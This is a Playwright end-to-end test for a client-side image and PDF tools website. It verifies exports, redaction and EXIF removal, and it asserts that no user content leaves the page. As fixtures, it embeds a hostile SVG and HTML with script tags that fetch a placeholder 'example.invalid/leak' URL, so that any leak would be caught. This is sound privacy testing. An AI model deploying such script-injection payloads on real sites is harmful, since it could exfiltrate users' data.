import { getDocument } from 'pdfjs-dist/legacy/build/pdf.mjs';
import { createCanvas } from '@napi-rs/canvas';
import { passwordFixture } from './password-fixture.mjs';
import { chromium } from '@playwright/test';
import AxeBuilder from '@axe-core/playwright';
import assert from 'node:assert/strict';
import { PDFDocument, PDFName } from 'pdf-lib';
import sharp from 'sharp';
import { mkdir, readFile, writeFile } from 'node:fs/promises';
await mkdir('test-results', { recursive: true });
const base = process.env.BASE_URL || 'http://localhost:4321';
const browser = await chromium.launch();
const context = await browser.newContext({ reducedMotion: 'reduce' });
const page = await context.newPage();
page.setDefaultTimeout(20000);
const errors = [],
  network = [];
page.on('pageerror', (e) => errors.push(e.message));
context.on('request', (request) => {
  const url = request.url();
  if (!/^https?:/.test(url)) return;
  if (
    new URL(url).origin !== new URL(base).origin ||
    request.method() !== 'GET' ||
    request.postData() ||
    url.includes('PRIVATE_SENTINEL')
  )
    network.push({ url, method: request.method(), body: request.postData() });
});
const png = await sharp({
  create: { width: 240, height: 160, channels: 3, background: '#c45544' },
})
  .png()
  .toBuffer();
const uploadImage = {
  name: 'PRIVATE_SENTINEL.png',
  mimeType: 'image/png',
  buffer: png,
};
const doc = await PDFDocument.create();
doc
  .addPage([300, 400])
  .drawText('PRIVATE_SENTINEL one', { x: 20, y: 300, size: 15 });
doc
  .addPage([400, 300])
  .drawText('PRIVATE_SENTINEL two', { x: 20, y: 200, size: 15 });
const pdf = Buffer.from(await doc.save());
const uploadPDF = {
  name: 'PRIVATE_SENTINEL.pdf',
  mimeType: 'application/pdf',
  buffer: pdf,
};
// Read outputs through real downloads: the page CSP (connect-src 'self') blocks fetch(blob:).
const blob = async (selector) => {
  const [download] = await Promise.all([
    page.waitForEvent('download'),
    page.locator(selector).first().click(),
  ]);
  return readFile(await download.path());
};
async function exported(button, links, status) {
  await page.locator(button).click();
  try {
    await page.locator(links).first().waitFor({ state: 'visible' });
  } catch (error) {
    throw new Error(await page.locator(status).innerText(), { cause: error });
  }
}
try {
  await page.goto(base);
  assert.equal(await page.locator('#tool-grid [data-tool-card]').count(), 41); // Remove Background was retired
  await page.locator('[data-filter=pdf]').click();
  assert.equal(
    await page.locator('#tool-grid [data-tool-card]:visible').count(),
    await page.locator('#tool-grid [data-tool-category=PDF]').count(),
  );
  await page.locator('#home-search').fill('merge');
  assert.equal(
    await page.locator('#tool-grid [data-tool-card]:visible').count(),
    1,
  );
  await page.locator('[data-filter=all]').click();
  await page.locator('#home-search').fill('');
  await page.locator('[data-goal=font]').click();
  assert.match(
    await page
      .locator('[data-goal-panel]:not([hidden]) .rec-card:first-child')
      .innerText(),
    /Font Finder/,
  );
  assert.ok(
    !(await page.getByText('Text essentials', { exact: true }).count()),
  );
  for (const mode of [
    'convert-to-jpg',
    'meme-generator',
    'photo-editor',
    'crop-image',
    'rotate-image',
    'convert-from-jpg',
    'watermark-image',
    'blur-face',
  ]) {
    await page.goto(base + '/' + mode + '/');
    await page.locator('#local-files').setInputFiles(uploadImage);
    await page.locator('#local-editor').waitFor({ state: 'visible' });
    await page.evaluate(() =>
      document
        .querySelectorAll('#image-editor details')
        .forEach((d) => (d.open = true)),
    );
    if (['meme-generator', 'watermark-image'].includes(mode))
      await page.locator('#edit-text').fill('PRIVATE caption');
    if (mode === 'crop-image') {
      await page.locator('#edit-w').fill('120');
      await page.locator('#edit-h').fill('80');
    }
    if (mode === 'photo-editor') {
      await page.locator('[data-tab=filters]').click();
      await page
        .locator('.filter-swatch:has(input[value="grayscale(1)"])')
        .click();
      await page.locator('[data-tab=sticker]').click();
      await page.locator('#loki-sticker').check();
      await page.locator('[data-tab=frame]').click();
      await page.locator('#frame-size').fill('8');
    }
    if (mode === 'blur-face') {
      const pattern = Buffer.alloc(240 * 160 * 3);
      for (let y = 0; y < 160; y++)
        for (let x = 0; x < 240; x++)
          pattern.fill(
            x % 2 ? 255 : 0,
            (y * 240 + x) * 3,
            (y * 240 + x) * 3 + 3,
          );
      await page.locator('#local-files').setInputFiles({
        ...uploadImage,
        buffer: await sharp(pattern, {
          raw: { width: 240, height: 160, channels: 3 },
        })
          .png()
          .toBuffer(),
      });
      await page
        .locator('#local-status')
        .filter({ hasText: 'Ready.' })
        .waitFor();
    }
    if (mode === 'watermark-image') {
      await page.locator('#stamp-tile').check();
    }
    if (mode === 'blur-face') {
      await page.evaluate(() =>
        document
          .querySelectorAll('#image-editor details')
          .forEach((d) => (d.open = true)),
      );
      await page.locator('#edit-w').fill('120');
      await page.locator('#edit-h').fill('80');
      await page.locator('#add-blur').click();
    }
    if (mode === 'convert-from-jpg') {
      await page
        .locator('#local-files')
        .setInputFiles([uploadImage, { ...uploadImage, name: 'frame2.png' }]);
      await page
        .locator('#local-status')
        .filter({ hasText: 'Ready.' })
        .waitFor();
      await page.locator('.format-card:has(input[value="image/gif"])').click();
    }
    await exported('#edit-export', '#local-output a', '#local-status');
    const bytes = Buffer.from(await blob('#local-output a'));
    const metadata = await sharp(bytes, { animated: true }).metadata();
    assert.ok(metadata.width > 0);
    if (mode === 'crop-image') assert.equal(metadata.width, 120);
    if (mode === 'rotate-image') assert.equal(metadata.width, 160);
    if (mode === 'convert-to-jpg') assert.equal(metadata.format, 'jpeg');
    if (mode === 'convert-from-jpg') assert.equal(metadata.pages, 2);
    if (['meme-generator', 'photo-editor', 'watermark-image'].includes(mode)) {
      const changed = await sharp(bytes).ensureAlpha().raw().toBuffer();
      const original = await sharp(png).ensureAlpha().raw().toBuffer();
      assert.notDeepEqual(changed, original, mode + ' must change pixels');
    }
    if (mode === 'blur-face') {
      const pixels = await sharp(bytes).ensureAlpha().raw().toBuffer();
      const inside = pixels[(32 * 240 + 60) * 4];
      assert.ok(
        inside > 20 && inside < 235,
        'Blur must smooth alternating black/white pixels',
      );
      assert.equal(
        pixels[(120 * 240 + 180) * 4],
        0,
        'Pixels outside region remain intact',
      );
    }
    await page.locator('#local-result [data-start-over]').click();
    assert.equal(await page.locator('#local-output a').count(), 0);
    console.log('PASS image', mode);
  }
  // Remove Image Metadata: a JPEG carrying EXIF (camera + GPS) comes back clean.
  {
    const withExif = await sharp(png)
      .jpeg()
      .withExif({ IFD0: { Make: 'TestCam', Model: 'PRIVATE_SENTINEL' } })
      .toBuffer();
    assert.ok((await sharp(withExif).metadata()).exif, 'fixture has EXIF');
    await page.goto(base + '/remove-image-metadata/');
    await page.locator('#local-files').setInputFiles({
      name: 'camera.jpg',
      mimeType: 'image/jpeg',
      buffer: withExif,
    });
    await page.locator('#local-editor').waitFor({ state: 'visible' });
    await page.locator('#image-info[data-state=found]').waitFor();
    await exported('#edit-export', '#local-output a', '#local-status');
    const clean = Buffer.from(await blob('#local-output a'));
    const meta = await sharp(clean).metadata();
    assert.equal(meta.format, 'jpeg');
    assert.equal(meta.exif, undefined, 'output must not carry EXIF');
    assert.ok(!clean.includes('PRIVATE_SENTINEL'));
    assert.match(await page.locator('#local-status').innerText(), /Checked/);
    console.log('PASS image remove-image-metadata');
  }
  // Image Size Checker: details only, no export button.
  {
    await page.goto(base + '/image-size-checker/');
    await page.locator('#local-files').setInputFiles(uploadImage);
    await page.locator('#local-editor').waitFor({ state: 'visible' });
    await page.locator('#image-info dd').first().waitFor();
    const info = await page.locator('#image-info').innerText();
    assert.match(info, /PNG/);
    assert.match(info, /\d+ × \d+ px/);
    assert.equal(await page.locator('#edit-export').count(), 0);
    console.log('PASS image image-size-checker');
  }
  // Favicon Generator: the full set with exact file names.
  {
    await page.goto(base + '/favicon-generator/');
    await page.locator('#local-files').setInputFiles(uploadImage);
    await page.locator('#local-editor').waitFor({ state: 'visible' });
    await exported('#edit-export', '#local-output a', '#local-status');
    const names = await page
      .locator('#local-output a')
      .evaluateAll((links) => links.map((a) => a.getAttribute('download')));
    for (const name of [
      'favicon.ico',
      'favicon-32x32.png',
      'apple-touch-icon.png',
      'android-chrome-512x512.png',
      'site.webmanifest',
    ])
      assert.ok(names.includes(name), name);
    const icon = Buffer.from(
      await blob('#local-output a[download="favicon-32x32.png"]'),
    );
    const iconMeta = await sharp(icon).metadata();
    assert.equal(iconMeta.width, 32);
    assert.equal(iconMeta.height, 32);
    console.log('PASS image favicon-generator');
  }
  // TIFF and hostile SVG use the real JPG conversion path.
  for (const fixture of [
    {
      name: 'sample.tiff',
      mimeType: 'image/tiff',
      buffer: await sharp(png).tiff().toBuffer(),
    },
    {
      name: 'sample.svg',
      mimeType: 'image/svg+xml',
      buffer: Buffer.from(
        '<svg xmlns="http://www.w3.org/2000/svg" width="120" height="80"><rect width="120" height="80" fill="red"/><script>fetch("https://example.invalid/PRIVATE_SENTINEL")</script><image href="https://example.invalid/PRIVATE_SENTINEL"/></svg>',
      ),
    },
  ]) {
    await page.goto(base + '/convert-to-jpg/');
    await page.locator('#local-files').setInputFiles(fixture);
    await page.locator('#local-editor').waitFor({ state: 'visible' });
    await exported('#edit-export', '#local-output a', '#local-status');
    assert.equal(
      (await sharp(Buffer.from(await blob('#local-output a'))).metadata())
        .format,
      'jpeg',
    );
  }
  for (const mode of ['html-to-image', 'html-to-pdf']) {
    await page.goto(base + '/' + mode + '/');
    await page
      .locator('#html-input')
      .fill(
        '<h1>PRIVATE_SENTINEL</h1><img src="https://example.invalid/PRIVATE_SENTINEL"><script>fetch("https://example.invalid/leak")</script><div style="background-image:url(https://example.invalid)">Local</div>',
      );
    await exported('#html-render', '#html-output a', '#html-status');
    const bytes = Buffer.from(await blob('#html-output a'));
    if (mode === 'html-to-image')
      assert.equal((await sharp(bytes).metadata()).width, 800);
    else assert.equal((await PDFDocument.load(bytes)).getPageCount(), 1);
    console.log('PASS HTML', mode);
  }
  for (const mode of [
    'merge-pdf',
    'split-pdf',
    'remove-pages',
    'extract-pages',
    'organize-pdf',
    'jpg-to-pdf',
    'scan-to-pdf',
    'compress-pdf',
    'repair-pdf',
    'pdf-to-jpg',
    'pdf-to-text',
    'rotate-pdf',
    'page-numbers',
    'watermark-pdf',
    'crop-pdf',
    'edit-pdf',
    'pdf-forms',
    'sign-pdf',
    'redact-pdf',
    'compare-pdf',
  ]) {
    await page.goto(base + '/' + mode + '/');
    let input = uploadPDF;
    if (mode === 'pdf-forms') {
      const form = await PDFDocument.create();
      const p = form.addPage();
      form.getForm().createTextField('Name').addToPage(p);
      input = { ...uploadPDF, buffer: Buffer.from(await form.save()) };
    }
    await page
      .locator('#pdf-files')
      .setInputFiles(
        ['jpg-to-pdf', 'scan-to-pdf'].includes(mode)
          ? [uploadImage]
          : ['merge-pdf', 'compare-pdf'].includes(mode)
            ? [input, { ...input, name: 'second.pdf' }]
            : input,
      );
    try {
      await page.waitForFunction(
        () =>
          (!document.getElementById('pdf-editor').hidden &&
            document
              .getElementById('pdf-status')
              .textContent.includes('ready')) ||
          document
            .getElementById('pdf-status')
            .textContent.includes('fields found'),
      );
    } catch (e) {
      throw new Error(
        mode + ': ' + (await page.locator('#pdf-status').innerText()),
        { cause: e },
      );
    }
    if (mode === 'remove-pages')
      await page.locator('#pdf-pages input[type=checkbox]').first().check();
    if (mode === 'extract-pages')
      await page.locator('#pdf-pages input[type=checkbox]').last().uncheck();
    if (mode === 'split-pdf')
      await page.locator('.format-card:has(input[value=every])').click();
    await page.evaluate(() =>
      document
        .querySelectorAll('#pdf-tool details')
        .forEach((d) => (d.open = true)),
    );
    if (mode === 'pdf-forms')
      await page
        .locator('[data-field-name=Name]')
        .fill('PRIVATE_SENTINEL filled');
    if (mode === 'edit-pdf')
      await page.locator('#pdf-text').fill('PRIVATE_SENTINEL signature');
    if (mode === 'watermark-pdf') await page.locator('#pdf-text').fill('DRAFT');
    if (mode === 'edit-pdf') {
      await page.locator('[data-tab=draw]').click();
      await page.evaluate(() =>
        document
          .querySelectorAll('#pdf-tool details')
          .forEach((d) => (d.open = true)),
      );
      await page.locator('#add-shape').click();
    }
    if (mode === 'sign-pdf') {
      await page.locator('#signature-pad').scrollIntoViewIfNeeded();
      const pad = await page.locator('#signature-pad').boundingBox();
      await page.mouse.move(pad.x + 20, pad.y + 30);
      await page.mouse.down();
      await page.mouse.move(pad.x + 100, pad.y + 80, { steps: 12 });
      await page.mouse.up();
    }
    if (mode === 'redact-pdf') {
      await page.locator('#pdf-rect-x').fill('0');
      await page.locator('#pdf-rect-y').fill('0');
      await page.locator('#pdf-rect-w').fill('100');
      await page.locator('#pdf-rect-h').fill('100');
      await page.locator('#add-redaction').click();
    }
    await exported('#pdf-export', '#pdf-output a', '#pdf-status');
    const bytes = Buffer.from(await blob('#pdf-output a'));
    if (!['pdf-to-jpg', 'pdf-to-text', 'compare-pdf'].includes(mode)) {
      const output = await PDFDocument.load(bytes);
      assert.ok(output.getPageCount() > 0);
      if (mode === 'merge-pdf') assert.equal(output.getPageCount(), 4);
      if (
        [
          'remove-pages',
          'extract-pages',
          'jpg-to-pdf',
          'scan-to-pdf',
          'split-pdf',
        ].includes(mode)
      )
        assert.equal(output.getPageCount(), 1);
      if (mode === 'rotate-pdf')
        assert.equal(output.getPage(0).getRotation().angle, 90);
      if (mode === 'crop-pdf')
        assert.equal(output.getPage(0).getCropBox().width, 240);
      if (mode === 'pdf-forms')
        assert.equal(
          output.getForm().getTextField('Name').getText(),
          'PRIVATE_SENTINEL filled',
        );
      if (mode === 'remove-pages')
        assert.equal(output.getPage(0).getWidth(), 400);
      if (mode === 'extract-pages')
        assert.equal(output.getPage(0).getWidth(), 300);
      if (mode === 'sign-pdf')
        assert.ok(
          output
            .getPage(0)
            .node.Resources()
            .lookup(PDFName.of('XObject'))
            .entries().length > 0,
          'Drawn signature must be embedded',
        );
      if (['page-numbers', 'watermark-pdf', 'edit-pdf'].includes(mode)) {
        const check = await getDocument({
          data: new Uint8Array(bytes),
          useSystemFonts: true,
        }).promise;
        const content = await (await check.getPage(1)).getTextContent();
        const text = content.items
          .filter((i) => 'str' in i)
          .map((i) => i.str)
          .join(' ');
        assert.ok(
          text.includes(
            mode === 'page-numbers'
              ? '1 / 2'
              : mode === 'watermark-pdf'
                ? 'DRAFT'
                : 'PRIVATE_SENTINEL signature',
          ),
        );
        await check.loadingTask.destroy();
      }
      if (mode === 'redact-pdf') {
        const verifyDoc = await getDocument({
          data: new Uint8Array(bytes),
          useSystemFonts: true,
        }).promise;
        const verifyPage = await verifyDoc.getPage(1),
          content = await verifyPage.getTextContent(),
          text = content.items
            .filter((i) => 'str' in i)
            .map((i) => i.str)
            .join('');
        const viewport = verifyPage.getViewport({ scale: 1 }),
          verifyCanvas = createCanvas(viewport.width, viewport.height);
        await verifyPage.render({
          canvas: verifyCanvas,
          canvasContext: verifyCanvas.getContext('2d'),
          viewport,
        }).promise;
        const verified = {
          text,
          pixel: [
            ...verifyCanvas.getContext('2d').getImageData(100, 100, 1, 1).data,
          ],
        };
        await verifyDoc.loadingTask.destroy();
        assert.equal(verified.text, '');
        assert.deepEqual(verified.pixel, [0, 0, 0, 255]);
      }
    } else if (mode === 'pdf-to-jpg')
      assert.equal((await sharp(bytes).metadata()).format, 'jpeg');
    else assert.match(bytes.toString(), /PRIVATE_SENTINEL/);
    if (
      [
        'merge-pdf',
        'compress-pdf',
        'pdf-to-jpg',
        'sign-pdf',
        'redact-pdf',
      ].includes(mode)
    ) {
      for (const theme of ['light', 'dark']) {
        await page.evaluate(
          (t) => (document.documentElement.dataset.theme = t),
          theme,
        );
        for (const width of [375, 1440]) {
          await page.setViewportSize({ width, height: 1000 });
          assert.ok(
            await page.evaluate(
              () => document.documentElement.scrollWidth <= innerWidth,
            ),
          );
          await page.screenshot({
            path: `test-results/flow-${mode}-${theme}-${width}.png`,
            fullPage: true,
            animations: 'disabled',
          });
        }
      }
      const result = await new AxeBuilder({ page })
        .withTags(['wcag2a', 'wcag2aa', 'wcag21aa'])
        .analyze();
      assert.deepEqual(
        result.violations.map((v) => ({
          id: v.id,
          nodes: v.nodes.map((n) => n.target),
        })),
        [],
        mode + ' editor/results',
      );
    }
    await page.locator('#pdf-result [data-start-over]').click();
    assert.equal(await page.locator('#pdf-output a').count(), 0);
    console.log('PASS PDF', mode);
  }
  await page.goto(base + '/unlock-pdf/');
  await page.locator('#pdf-password').fill('incorrect');
  await page.locator('#pdf-files').setInputFiles({
    name: 'locked.pdf',
    mimeType: 'application/pdf',
    buffer: passwordFixture(),
  });
  await page.locator('#pdf-status').filter({ hasText: 'incorrect' }).waitFor();
  await page.locator('#pdf-password').fill('kitty-test');
  await page.locator('#pdf-files').setInputFiles({
    name: 'locked.pdf',
    mimeType: 'application/pdf',
    buffer: passwordFixture(),
  });
  await page.locator('#pdf-status').filter({ hasText: 'ready' }).waitFor();
  await exported('#pdf-export', '#pdf-output a', '#pdf-status');
  assert.equal(
    (
      await PDFDocument.load(new Uint8Array(await blob('#pdf-output a')))
    ).getPageCount(),
    1,
  );
  console.log('PASS password-required unlock and wrong-password recovery');
  for (const path of [
    '/',
    '/compress-image/',
    '/resize-image/',
    '/photo-editor/',
    '/merge-pdf/',
    '/compress-pdf/',
    '/pdf-to-jpg/',
    '/redact-pdf/',
    '/font-finder/',
    '/compress-image-to-20kb/',
  ]) {
    await page.goto(base + path);
    for (const theme of ['light', 'dark']) {
      await page.evaluate(
        (t) => (document.documentElement.dataset.theme = t),
        theme,
      );
      for (const width of [375, 1440]) {
        await page.setViewportSize({ width, height: 1000 });
        assert.ok(
          await page.evaluate(
            () => document.documentElement.scrollWidth <= innerWidth,
          ),
          path + ' overflow',
        );
        await page.screenshot({
          path: `test-results/product-${path.replaceAll('/', '_') || 'home'}-${theme}-${width}.png`,
          fullPage: true,
          animations: 'disabled',
        });
      }
      const results = await new AxeBuilder({ page })
        .withTags(['wcag2a', 'wcag2aa', 'wcag21aa'])
        .analyze();
      assert.deepEqual(
        results.violations.map((v) => ({
          id: v.id,
          nodes: v.nodes.map((n) => n.target),
        })),
        [],
        path + ' ' + theme,
      );
    }
  }
  assert.deepEqual(
    network,
    [],
    'No outbound user content, external requests or non-GET processing requests',
  );
  assert.deepEqual(errors, []);
  console.log(
    'PASS: all Phase 1 browser exports, privacy/network, unsafe HTML isolation, secure raster redaction, responsive themes and accessibility.',
  );
} finally {
  await writeFile(
    'test-results/product-network.json',
    JSON.stringify({ violations: network, consoleErrors: errors }, null, 2),
  );
  await browser.close();
}
